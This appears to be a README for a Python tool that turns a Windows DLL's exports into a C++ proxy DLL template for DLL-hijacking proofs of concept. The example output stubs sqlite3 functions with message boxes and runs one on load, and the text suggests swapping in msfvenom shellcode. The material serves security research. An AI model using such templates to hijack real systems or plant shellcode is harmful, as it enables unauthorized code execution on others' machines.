# DLL-Spoofer 
This python script scans a provided DLL's exports and creates a basic duplicate CPP DLL template. All exported functions are re-used and pop a simple message window. 
Additionally on DLL attach we execute the first exported function. This is useful for simple providing POC for DLL hijacking since we're not duping function arguements. 

This can easily be used to execute shellcode generated via msfvenom. Just replace the first function in the output template. 


# Usage

``` python3 spoof.py
usage: spoof.py [-h] dll_path

Generate a C++ source file for a DLL that displays MessageBox for exported functions.

positional arguments:
  dll_path    Path to the DLL to inspect and create the C++ source for.

optional arguments:
  -h, --help  show this help message and exit

```

## Simply create a CPP DLL project, copy and paste the output file from the script. Build and profit???

Always appreciate a shout out in research if you use this! 

# Example 
python .\spoof.py .\StateRepository.Core\StateRepository.Core.dll

--> ExportedFunctions.cpp
```
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <windows.h>

extern "C" {

__declspec(dllexport) void sqlite3_aggregate_context() {
    MessageBox(NULL, L"sqlite3_aggregate_context called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_aggregate_count() {
    MessageBox(NULL, L"sqlite3_aggregate_count called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_auto_extension() {
    MessageBox(NULL, L"sqlite3_auto_extension called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_backup_finish() {
    MessageBox(NULL, L"sqlite3_backup_finish called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_backup_init() {
    MessageBox(NULL, L"sqlite3_backup_init called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_backup_pagecount() {
    MessageBox(NULL, L"sqlite3_backup_pagecount called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_backup_remaining() {
    MessageBox(NULL, L"sqlite3_backup_remaining called", L"Function Call", MB_OK);
}

..... 
..... 
..... //Snipped like 30 other functions for example

__declspec(dllexport) void sqlite3_win32_utf8_to_mbcs_v2() {
    MessageBox(NULL, L"sqlite3_win32_utf8_to_mbcs_v2 called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_win32_utf8_to_unicode() {
    MessageBox(NULL, L"sqlite3_win32_utf8_to_unicode called", L"Function Call", MB_OK);
}

__declspec(dllexport) void sqlite3_win32_write_debug() {
    MessageBox(NULL, L"sqlite3_win32_write_debug called", L"Function Call", MB_OK);
}

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
		sqlite3_aggregate_context();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```
